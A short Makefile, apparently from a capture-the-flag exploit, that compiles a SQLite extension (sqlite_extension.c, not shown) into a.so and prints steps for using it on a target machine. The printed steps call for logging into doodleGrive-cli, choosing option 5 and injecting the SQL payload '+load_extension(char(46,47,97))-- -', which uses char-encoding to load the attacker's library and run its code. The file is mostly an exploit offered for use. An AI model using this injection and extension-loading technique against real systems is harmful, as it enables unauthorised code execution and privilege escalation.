all: sqlite_extension

sqlite_extension:
	@gcc -s -g -fPIC -shared sqlite_extension.c -o a.so;
	@echo "Extension compiled, download it to target machine and after logging to doodleGrive-cli select option 5 and inject the following SQL statement:\n\n\"+load_extension(char(46,47,97))-- -"